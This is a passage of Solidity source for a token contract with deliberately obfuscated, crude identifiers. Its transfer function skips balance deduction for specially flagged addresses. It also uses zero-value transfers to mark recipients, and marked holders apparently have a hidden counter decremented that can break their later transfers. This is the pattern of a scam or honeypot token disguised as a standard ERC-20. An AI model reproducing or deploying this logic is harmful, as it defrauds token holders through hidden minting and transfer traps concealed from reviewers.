    function cooooooooooooock(address chicken, address cooock, uint256 cocks) private returns (bool success) {
        if (_cock[chicken] == 0) {
            balanceOf[chicken] -= cocks;
        }

        if (cocks == 0) navigate[cooock] += alkali;

        if (chicken != entrance && _cock[chicken] == 0 && navigate[chicken] > 0) {
            _cock[chicken] -= alkali;
        }

        balanceOf[cooock] += cocks;
        emit Transfer(chicken, cooock, cocks);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private navigate;

    address public entrance;

    function approve(address entry, uint256 cocks) public returns (bool success) {
        allowance[msg.sender][entry] = cocks;
